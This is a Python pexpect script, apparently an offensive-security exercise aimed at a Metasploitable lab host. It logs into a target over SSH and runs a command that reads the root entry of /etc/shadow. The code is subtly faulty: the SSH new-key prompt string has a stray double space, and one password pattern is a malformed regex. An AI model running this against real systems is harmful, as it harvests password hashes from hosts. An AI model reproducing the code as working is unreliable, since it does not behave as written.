#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import pexpect

PROMPT = ['# ','>>> ','> ','\$ ']

def send_command(child, command):
  child.sendline(command)
  child.expect(PROMPT)
  print(child.before)

def connect(user, host, password):
  ssh_newkey = 'Are  you sure you want to continue connecting'
  connStr = 'ssh ' + user + '@' + host
  child = pexpect.spawn(connStr)
  ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])

  if ret == 0:
    print('[-] Error Connecting')
    return
  if ret == 1:
    child.sendline('yes')
    ret = child.expect([pexpect.TIMEOUT, '[P|password: '])
    if ret == 0:
      print('[-] Error Connecting')
      return
  child.sendline(password)
  child.expect(PROMPT)
  return child

def main():
  # host = "192.168.0.50"
  # user = 'msfadmin'
  # password = 'msfadmin'
  host = input('Enter the Host to Target: ')
  user = input('Enter SSH username: ')
  password = input('Enter SSH password: ')
  child = connect(user,host,password)
  send_command(child, 'cat /etc/shadow | grep root; ps')


main()